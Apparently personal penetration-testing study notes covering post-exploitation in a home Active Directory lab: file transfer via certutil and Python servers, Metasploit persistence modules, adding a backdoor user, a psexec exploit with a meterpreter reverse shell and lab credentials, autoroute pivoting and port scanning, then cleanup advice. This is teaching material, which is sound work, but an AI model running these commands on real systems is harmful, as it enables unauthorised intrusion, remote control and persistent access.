# File Trnsfers Review
- certutil - `certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt`
- HTTP - `python -m simplehttpserver 80`
- browser - `navigate directly to file`
- FTP - `python -m pyftpdlib 21 (attacker machine) , ftp 10.10.10.10`
- linux - `wget`

# Maintaining Access
- persistent scripts
	- run persistence -h
	- exploit/windows/local/persistence
	- exploit/windows/local/registry_persistence
- scheduled tasks
	- run scheduleme
	- run schtaskabuse
- add a user (this is heath recommendation, the above are metasploit - can be dangerous, mainly used in redteaming not pentesting)
	- net user hacker password123 /add (loud, but suitable for pentesting)

# Pivoting
Simple example using meterpreter psexec on AD lab machines
can also use a tool called proxychains
```bash
#in msfconsole
use exploit/windows/smb/psxec
options #to check parameters
set rhosts 192.168.57.141 #frank castle machine
set smbdomain marvel.local
set smbpass Password1
set smbuser fcastle

#choose payload
set payload windows/x64/meterpreter/reverse_tcp
set lhost eth0
options #check

set target 2
run #execute >> if STATED VIRUS make sure it's turned off
```
- post exploitation
	- once in, things to run:
		- `route print` - check routing
		- `IP` - confirm NICs
		- `arp - a` - what else is it talking to 
			- how can we also talk to these? we need to pivot
- can `^c` to terminate channel 1
- in meterpreter
```bash
run autoroute 10.10.10.0/24 #from IP we exploited, make a route from that to this network

run autoroute -p
background #background session 1
#can use portscan to verify if pivoted to network
search portscan
use 5 #tcpscan
options #set parameters
set rhosts 10.10.10.129
set ports 445 #set based on enum info
run
```

# Cleanup
Pentest perspective
- ❗️ make the system/network as it was when you entered it
	- remove executables, scripts, and added files
	- remove malware, rootkits, and added user accounts
	- set settings back to original configurations
